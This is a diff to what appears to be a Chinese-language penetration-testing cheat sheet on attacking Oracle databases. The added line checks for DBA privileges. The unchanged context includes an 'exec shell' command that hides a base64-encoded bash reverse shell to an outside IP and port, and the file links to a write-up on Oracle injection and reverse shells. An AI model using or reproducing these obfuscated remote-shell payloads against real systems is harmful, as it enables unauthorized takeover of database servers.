@@ -18,6 +18,7 @@ sqlplus username/password@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(Host=<IP>)(Port=1
 set serveroutput on;
 exec dbms_java.set_output(131072);
 exec shell('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMS4xMS4xMTEuMjMzLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}');
+select userenv('isdba') from dual; # 查看是否dba
 ```
 ## 注入
 - https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/
